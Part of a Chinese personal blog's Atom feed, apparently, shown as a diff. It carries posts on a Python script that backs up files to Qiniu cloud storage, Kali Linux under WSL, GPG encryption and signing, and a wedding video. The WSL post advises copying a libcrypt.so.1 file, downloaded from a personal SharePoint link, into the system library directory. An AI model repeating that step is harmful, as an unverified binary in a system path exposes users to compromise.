+    <category term="网络日志" scheme="https://blog.iambug.cn/categories/%E7%BD%91%E7%BB%9C%E6%97%A5%E5%BF%97/"/>
+    
+    
+    <category term="Python" scheme="https://blog.iambug.cn/tags/Python/"/>
+    
+    <category term="PyInstaller" scheme="https://blog.iambug.cn/tags/PyInstaller/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>备份服务器文件上传到七牛云</title>
+    <link href="https://blog.iambug.cn/articles/13652.html"/>
+    <id>https://blog.iambug.cn/articles/13652.html</id>
+    <published>2022-01-08T14:44:00.000Z</published>
+    <updated>2022-01-16T08:10:31.650Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="新建空间"><a href="#新建空间" class="headerlink" title="新建空间"></a>新建空间</h2><p>注册<a href="https://s.qiniu.com/JF7nyq">七牛云</a>账号，然后在对象存储的空间管理中新建空间，此过程需要先进行实名认证，认证后可以获得 10G 的免费存储空间。</p><span id="more"></span><h2 id="安装Qiniu"><a href="#安装Qiniu" class="headerlink" title="安装Qiniu"></a>安装Qiniu</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install qiniu</span><br></pre></td></tr></table></figure><h2 id="配置脚本"><a href="#配置脚本" class="headerlink" title="配置脚本"></a>配置脚本</h2><p>下载 <a href="https://github.com/YangGerald/Just-for-Fun/raw/main/backup_file_to_qiniu/backup_file_to_qiniu.py">backup_file_to_qiniu.py</a>，配置 <code>access_key</code>、<code>secret_key</code>、<code>backup_dir</code>、<code>backup_name</code>、<code>bucket_name</code> 的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># flake8: noqa</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> qiniu <span class="keyword">import</span> Auth, put_file, etag, urlsafe_base64_encode</span><br><span class="line"><span class="keyword">import</span> qiniu.config</span><br><span class="line"><span class="keyword">from</span> qiniu.compat <span class="keyword">import</span> is_py2, is_py3</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要填写你的 Access Key 和 Secret Key</span></span><br><span class="line">access_key = <span class="string">&#x27;Access_Key&#x27;</span></span><br><span class="line">secret_key = <span class="string">&#x27;Secret_Key&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建鉴权对象</span></span><br><span class="line">q = Auth(access_key, secret_key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前日期和时间</span></span><br><span class="line">date = time.strftime(<span class="string">&#x27;%Y-%m-%d-%H-%M&#x27;</span>, time.localtime())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 要备份的目录，多个请用空格分隔</span></span><br><span class="line">backup_dir = <span class="string">&#x27;/data&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份名称</span></span><br><span class="line">backup_name = <span class="string">&#x27;data&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 要上传的空间</span></span><br><span class="line">bucket_name = <span class="string">&#x27;Bucket_Name&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传到七牛后保存的文件名</span></span><br><span class="line">key = backup_name + <span class="string">&#x27;_&#x27;</span> + date + <span class="string">&#x27;.zip&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成上传 Token，可以指定过期时间等</span></span><br><span class="line">token = q.upload_token(bucket_name, key, <span class="number">3600</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 要上传文件的本地路径</span></span><br><span class="line">localfile = <span class="string">&#x27;/tmp/&#x27;</span> + key</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;zip -rq /tmp/&#x27;</span> + key + <span class="string">&#x27; &#x27;</span> + backup_dir</span><br><span class="line">os.system(cmd)</span><br><span class="line"></span><br><span class="line">ret, info = put_file(token, key, localfile)</span><br><span class="line"><span class="built_in">print</span>(ret)</span><br><span class="line"><span class="built_in">print</span>(info)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> is_py2:</span><br><span class="line">    <span class="keyword">assert</span> ret[<span class="string">&#x27;key&#x27;</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>) == key</span><br><span class="line"><span class="keyword">elif</span> is_py3:</span><br><span class="line">    <span class="keyword">assert</span> ret[<span class="string">&#x27;key&#x27;</span>] == key</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> ret[<span class="string">&#x27;hash&#x27;</span>] == etag(localfile)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;rm -rf /tmp/&#x27;</span> + key)</span><br></pre></td></tr></table></figure><h2 id="执行备份"><a href="#执行备份" class="headerlink" title="执行备份"></a>执行备份</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python backup_file_to_qiniu.py</span><br></pre></td></tr></table></figure><h2 id="使用-Cron-自动化"><a href="#使用-Cron-自动化" class="headerlink" title="使用 Cron 自动化"></a>使用 Cron 自动化</h2><p>编辑 crontab。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure><p>添加以下定时任务，该任务将会在每月第一天到时自动执行备份脚本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 0 1 * * /usr/bin/env python /path/to/file/backup_file_to_qiniu.py &gt;&gt; /path/to/file/backup_file_to_qiniu.log</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;新建空间&quot;&gt;&lt;a href=&quot;#新建空间&quot; class=&quot;headerlink&quot; title=&quot;新建空间&quot;&gt;&lt;/a&gt;新建空间&lt;/h2&gt;&lt;p&gt;注册&lt;a href=&quot;https://s.qiniu.com/JF7nyq&quot;&gt;七牛云&lt;/a&gt;账号，然后在对象存储的空间管理中新建空间，此过程需要先进行实名认证，认证后可以获得 10G 的免费存储空间。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="系统运维" scheme="https://blog.iambug.cn/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/"/>
+    
+    
+    <category term="Python" scheme="https://blog.iambug.cn/tags/Python/"/>
+    
+    <category term="Linux" scheme="https://blog.iambug.cn/tags/Linux/"/>
+    
+    <category term="云存储" scheme="https://blog.iambug.cn/tags/%E4%BA%91%E5%AD%98%E5%82%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>特别的婚礼</title>
+    <link href="https://blog.iambug.cn/articles/45999.html"/>
+    <id>https://blog.iambug.cn/articles/45999.html</id>
+    <published>2021-12-05T07:41:00.000Z</published>
+    <updated>2021-12-05T11:59:09.574Z</updated>
+    
+    <content type="html"><![CDATA[<p>Beautiful，不需要再说什么了~</p><span id="more"></span><div style="position: relative; padding-top: 48%;">  <iframe style="position: absolute; left: 0; top: 0; width: 100%; height: 100%;" src="//player.bilibili.com/player.html?aid=634744041&bvid=BV1kb4y1i7Ar&cid=454992434&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe></div>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;Beautiful，不需要再说什么了~&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="闲言碎语" scheme="https://blog.iambug.cn/categories/%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD/"/>
+    
+    
+    <category term="Hallelujah" scheme="https://blog.iambug.cn/tags/Hallelujah/"/>
+    
+    <category term="教堂婚礼" scheme="https://blog.iambug.cn/tags/%E6%95%99%E5%A0%82%E5%A9%9A%E7%A4%BC/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>在 Windows 利用 WSL 运行 Linux 系统</title>
+    <link href="https://blog.iambug.cn/articles/54668.html"/>
+    <id>https://blog.iambug.cn/articles/54668.html</id>
+    <published>2021-11-27T01:23:00.000Z</published>
+    <updated>2021-12-04T07:43:14.378Z</updated>
+    
+    <content type="html"><![CDATA[<p>WSL 是一个可以直接在 Windows 上安装和运行 Linux 系统的工具，它使两个系统之间可以轻松的切换使用，而不必安装双系统，通过开关机反复切换系统，也无需虚拟机。本以为 WSL 相对于各自独立的双系统，表现会不尽如人意，但体验下来还挺不错。</p><span id="more"></span><h2 id="更新-WSL"><a href="#更新-WSL" class="headerlink" title="更新 WSL"></a>更新 WSL</h2><p>以管理员身份运行 PowerShell 或命令提示符，执行以下命令更新 WSL。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --update</span><br></pre></td></tr></table></figure><p>更新完成后，关闭 WSL。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --shutdown</span><br></pre></td></tr></table></figure><h2 id="安装-Kali-Linux"><a href="#安装-Kali-Linux" class="headerlink" title="安装 Kali Linux"></a>安装 Kali Linux</h2><p>默认情况下，<code>wsl --install</code> 命令安装的发行版是 Ubuntu，安装 Kali Linux 则使用 <code>-d</code> 参数指定发行版，列出发行版的命令为 <code>wsl -l -o</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --install -d kali-linux</span><br></pre></td></tr></table></figure><p>安装完成会弹出创建用户的窗口，请输入用户名和密码创建用户（此用户将成为默认用户在启动时自动登录并具有运行 <code>sudo</code> 命令的权限），或者直接关闭窗口，使用 <code>root</code> 作为默认用户登录。<br><img src="/images/2021-11-27/img-1.jpg" alt="创建用户"></p><h2 id="设置根用户密码"><a href="#设置根用户密码" class="headerlink" title="设置根用户密码"></a>设置根用户密码</h2><p>以 <code>root</code> 用户登录 Kali Linux：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl -u root</span><br></pre></td></tr></table></figure><p>设置密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure><h2 id="关于两个错误"><a href="#关于两个错误" class="headerlink" title="关于两个错误"></a>关于两个错误</h2><p>下载 <code>kali-archive-keyring_2020.2_all.deb</code> 文件，在开始菜单打开 Kali Linux，修改以下命令 <code>-i</code> 参数后面的路径，然后执行命令安装签名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i /mnt/c/Users/ROG/Downloads/kali-archive-keyring_2020.2_all.deb</span><br></pre></td></tr></table></figure><p>否则会出现如下错误：<br><img src="/images/2021-11-27/img-2.jpg" alt="EXPKEYSIG ED444FF07D8D0BF6">其次还需要下载并复制 <a href="https://pb82-my.sharepoint.com/:u:/g/personal/vebcoa_t_5tb_in/EY5OKRzo_8lDrrX4Gcqk1D0BPf3UKUJgaVHERIV-JUutfg?e=nn1gFb">libcrypt.so.1</a> 文件到 <code>/lib/x86_64-linux-gnu</code> 目录，安装依赖 libc-bin：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y libc-bin</span><br></pre></td></tr></table></figure><p>否则执行 <code>apt install -y nmap</code> 这样的安装命令会出现如下错误：<br><img src="/images/2021-11-27/img-3.jpg" alt="libcrypt.so.1: cannot open shared object file"><br><img src="/images/2021-11-27/img-4.jpg" alt="libc-bin 依赖"></p><h2 id="添加源"><a href="#添加源" class="headerlink" title="添加源"></a>添加源</h2><p>编辑 <code>sources.list</code> 文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>复制清华源和阿里源并添加到 <code>sources.list</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#清华源</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#deb-src http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#阿里源</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><p><img src="/images/2021-11-27/img-5.jpg" alt="sources.list">执行更新：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure><h2 id="安装-Win-KeX"><a href="#安装-Win-KeX" class="headerlink" title="安装 Win-KeX"></a>安装 Win-KeX</h2><p>安装 Win-KeX，为 Kali Linux 提供桌面体验。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y kali-win-kex</span><br></pre></td></tr></table></figure><h2 id="运行-Win-KeX"><a href="#运行-Win-KeX" class="headerlink" title="运行 Win-KeX"></a>运行 Win-KeX</h2><p>Win-KeX 支持窗口模式、增强的会话模式、无缝模式3种运行模式。</p><ul><li>有声音支持的窗口模式（需要设置 VNC 密码）<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kex --win -s</span><br></pre></td></tr></table></figure><img src="/images/2021-11-27/img-6.jpg" alt="窗口模式"></li><li>有声音支持和 arm 解决方法的增强会话模式<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kex --esm --ip -s</span><br></pre></td></tr></table></figure><img src="/images/2021-11-27/img-7.jpg" alt="增强会话模式"></li><li>有声音支持的无缝模式<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kex --sl -s</span><br></pre></td></tr></table></figure><img src="/images/2021-11-27/img-8.jpg" alt="无缝模式">如果使用 <a href="https://github.com/microsoft/terminal">Windows Terminal</a>，还可以为以上命令创建终端快捷方式，例如：<code>kex --sl -s</code>。<br><img src="/images/2021-11-27/img-9.jpg" alt="终端快捷方式"></li></ul><h2 id="Kali-Linux-Large"><a href="#Kali-Linux-Large" class="headerlink" title="Kali Linux Large"></a>Kali Linux Large</h2><p>如果希望 Kali Linux 包含更多的工具，则执行以下命令安装 Kali-Linux-Large，此操作会占用一定量的存储空间。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y kali-linux-large</span><br></pre></td></tr></table></figure><h2 id="设置系统语言为中文"><a href="#设置系统语言为中文" class="headerlink" title="设置系统语言为中文"></a>设置系统语言为中文</h2><p>安装 locales：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y locales</span><br></pre></td></tr></table></figure><p>执行以下命令进行区域设置，按空格键盘选择 <code>zh_CN.UTF-8 UTF-8</code>，下一步选择 <code>zh_CN.UTF-8</code> 作为默认的区域设置，然后重启 Kali Linux。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><h2 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h2><p>安装 <code>ibus</code>、<code>ibus-pinyin</code>、<code>im-config</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y ibus ibus-pinyin im-config</span><br></pre></td></tr></table></figure><p>执行以下命令设置输入法切换快捷键或添加删除输入法。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ibus-setup</span><br></pre></td></tr></table></figure><p>配置输入法为 iBus，再重启 Kali Linux。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">im-config</span><br></pre></td></tr></table></figure><h2 id="WPS-提示系统缺失字体"><a href="#WPS-提示系统缺失字体" class="headerlink" title="WPS 提示系统缺失字体"></a>WPS 提示系统缺失字体</h2><p>在系统安装 WPS 时，打开 WPS 会提示系统缺失字体。此时在 Windows 的 <code>C:\Windows\Fonts</code> 目录找到缺失的字体并复制到 <code>/usr/share/fonts/</code> 目录下，重新打开就正常了。</p>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;WSL 是一个可以直接在 Windows 上安装和运行 Linux 系统的工具，它使两个系统之间可以轻松的切换使用，而不必安装双系统，通过开关机反复切换系统，也无需虚拟机。本以为 WSL 相对于各自独立的双系统，表现会不尽如人意，但体验下来还挺不错。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="网络日志" scheme="https://blog.iambug.cn/categories/%E7%BD%91%E7%BB%9C%E6%97%A5%E5%BF%97/"/>
+    
+    
+    <category term="Kali" scheme="https://blog.iambug.cn/tags/Kali/"/>
+    
+    <category term="Windows" scheme="https://blog.iambug.cn/tags/Windows/"/>
+    
+    <category term="Linux" scheme="https://blog.iambug.cn/tags/Linux/"/>
+    
+    <category term="WSL" scheme="https://blog.iambug.cn/tags/WSL/"/>
+    
+    <category term="Win-KeX" scheme="https://blog.iambug.cn/tags/Win-KeX/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>GPG 加密和签名</title>
+    <link href="https://blog.iambug.cn/articles/10188.html"/>
+    <id>https://blog.iambug.cn/articles/10188.html</id>
+    <published>2021-11-09T13:48:00.000Z</published>
+    <updated>2021-11-20T17:02:20.540Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="安装-GPG"><a href="#安装-GPG" class="headerlink" title="安装 GPG"></a>安装 GPG</h2><p>下载并安装 <a href="https://www.gnupg.org/download/index.html">GPG</a>，在命令提示符运行以下命令查看版本，返回版本信息则说明安装成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --version</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="生成密钥对"><a href="#生成密钥对" class="headerlink" title="生成密钥对"></a>生成密钥对</h2><p>在使用 GPG 加密和签名之前，先执行以下命令生成密钥对。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --full-generate-key</span><br></pre></td></tr></table></figure><p>接着就是一些选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ROG&gt;gpg --full-generate-key</span><br><span class="line">gpg (GnuPG) 2.3.3; Copyright (C) 2021 g10 Code GmbH</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line"></span><br><span class="line">Please select what kind of key you want:</span><br><span class="line">   (1) RSA and RSA</span><br><span class="line">   (2) DSA and Elgamal</span><br><span class="line">   (3) DSA (sign only)</span><br><span class="line">   (4) RSA (sign only)</span><br><span class="line">   (9) ECC (sign and encrypt) *default*</span><br><span class="line">  (10) ECC (sign only)</span><br><span class="line">  (14) Existing key from card</span><br><span class="line">Your selection? 9</span><br><span class="line">Please select which elliptic curve you want:</span><br><span class="line">   (1) Curve 25519 *default*</span><br><span class="line">   (4) NIST P-384</span><br><span class="line">   (6) Brainpool P-256</span><br><span class="line">Your selection? 1</span><br><span class="line">Please specify how long the key should be valid.</span><br><span class="line">         0 = key does not expire</span><br><span class="line">      &lt;n&gt;  = key expires in n days</span><br><span class="line">      &lt;n&gt;w = key expires in n weeks</span><br><span class="line">      &lt;n&gt;m = key expires in n months</span><br><span class="line">      &lt;n&gt;y = key expires in n years</span><br><span class="line">Key is valid for? (0) 0</span><br><span class="line">Key does not expire at all</span><br><span class="line">Is this correct? (y/N) y</span><br></pre></td></tr></table></figure><p>还有输入 <code>Real name</code>、<code>Email address</code>、<code>Comment</code> 和口令。</p><h2 id="生成撤销证书"><a href="#生成撤销证书" class="headerlink" title="生成撤销证书"></a>生成撤销证书</h2><p>撤销证书只能在密钥可用时生成，所以生成密钥对后，应该为其生成一份撤销证书，以备在某些情况下撤销密钥。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --generate-revocation &quot;YourName&quot;</span><br></pre></td></tr></table></figure><h2 id="加密和解密文件"><a href="#加密和解密文件" class="headerlink" title="加密和解密文件"></a>加密和解密文件</h2><p>使用公钥加密 <code>data.zip</code> 文件，并将其输出为 <code>data.zip.gpg</code> 保存。其中 <code>--recipient</code> 参数用于指定接收者的 USER-ID，不过输入 USER-ID 有点儿麻烦，使用生成密钥对时输入的 <code>Real name</code> 简单多了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --recipient &quot;YourName&quot; --output &quot;data.zip.gpg&quot; --encrypt &quot;data.zip&quot;</span><br></pre></td></tr></table></figure><p>解密文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --output &quot;data.zip&quot; --decrypt &quot;data.zip.gpg&quot;</span><br></pre></td></tr></table></figure><h2 id="签名和验证文件"><a href="#签名和验证文件" class="headerlink" title="签名和验证文件"></a>签名和验证文件</h2><p><strong>明文签名：</strong><br>明文签名在平时可能会很少用到，但的确有这样的时候，我们需要让他人知道某个消息就是我们发的。此时，可以将要发送的内容放到 <code>message.txt</code> 文件中，再执行以下命令为 <code>message.txt</code> 签名（由于签名用的是私钥，需要输入口令），签名后会生成 <code>message.asc</code> 签名文件，此文件包含了发送内容与签名，将文件或复制文件中的内容发送给收件人，对方收到后就可以进行验证了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --local-user &quot;YourName&quot; --clear-sign &quot;message.txt&quot;</span><br></pre></td></tr></table></figure><p>作为收件人则要导入发件人的公钥，执行以下命令验证签名，如果收到的不是文件，则先将其保存为文本文件后再进行验证。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --verify &quot;message.asc&quot;</span><br></pre></td></tr></table></figure><p><strong>独立签名：</strong><br>要对 <code>Zip</code> 这类二进制文件签名时，不能将签名附加到文件中，而需要使用 <code>--detach-sign</code> 参数生成独立的签名文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --local-user &quot;YourName&quot; --output &quot;data.zip.sig&quot; --detach-sign &quot;data.zip&quot;</span><br></pre></td></tr></table></figure><p>这种签名方式在验证时，请将 <code>data.zip</code> 和 <code>data.zip.sig</code> 文件放在同一位置并执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --verify &quot;data.zip.sig&quot;</span><br></pre></td></tr></table></figure><h2 id="同时进行加密和签名"><a href="#同时进行加密和签名" class="headerlink" title="同时进行加密和签名"></a>同时进行加密和签名</h2><p>如果既加密又要签名，可以使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --local-user &quot;YourName&quot; --recipient &quot;YourName&quot; --output &quot;data.zip.gpg&quot; --sign --encrypt &quot;data.zip&quot;</span><br></pre></td></tr></table></figure><p>在解密文件时，GPG 会自动验证签名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --output &quot;data.zip&quot; --decrypt &quot;data.zip.gpg&quot;</span><br></pre></td></tr></table></figure><h2 id="导出密钥"><a href="#导出密钥" class="headerlink" title="导出密钥"></a>导出密钥</h2><p>导出公钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --output &quot;pubring.gpg&quot; --export &quot;YourName&quot;</span><br></pre></td></tr></table></figure><p>导出私钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --output &quot;secring.gpg&quot; --export-secret-keys &quot;YourName&quot;</span><br></pre></td></tr></table></figure><p>将 <code>C:\Users\ROG\AppData\Roaming\gnupg\trustdb.gpg</code> 和导出的 <code>pubring.gpg</code>、<code>secring.gpg</code> 进行保存。</p><h2 id="导入密钥"><a href="#导入密钥" class="headerlink" title="导入密钥"></a>导入密钥</h2><p>导入公钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --import &quot;pubring.gpg&quot;</span><br></pre></td></tr></table></figure><p>导入私钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --import &quot;secring.gpg&quot;</span><br></pre></td></tr></table></figure><p>然后复制 <code>trustdb.gpg</code> 到对应的位置。</p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;安装-GPG&quot;&gt;&lt;a href=&quot;#安装-GPG&quot; class=&quot;headerlink&quot; title=&quot;安装 GPG&quot;&gt;&lt;/a&gt;安装 GPG&lt;/h2&gt;&lt;p&gt;下载并安装 &lt;a href=&quot;https://www.gnupg.org/download/index.html&quot;&gt;GPG&lt;/a&gt;，在命令提示符运行以下命令查看版本，返回版本信息则说明安装成功。&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;gpg --version&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
+    
+    
+    
+    <category term="网络安全" scheme="https://blog.iambug.cn/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+    
+    <category term="GPG" scheme="https://blog.iambug.cn/tags/GPG/"/>
+    
+    <category term="加密" scheme="https://blog.iambug.cn/tags/%E5%8A%A0%E5%AF%86/"/>
+    
+    <category term="签名" scheme="https://blog.iambug.cn/tags/%E7%AD%BE%E5%90%8D/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PL/SQL Developer 14</title>
+    <link href="https://blog.iambug.cn/articles/1.html"/>
+    <id>https://blog.iambug.cn/articles/1.html</id>
+    <published>2021-10-13T06:07:00.000Z</published>
+    <updated>2021-10-13T06:43:34.000Z</updated>
+    
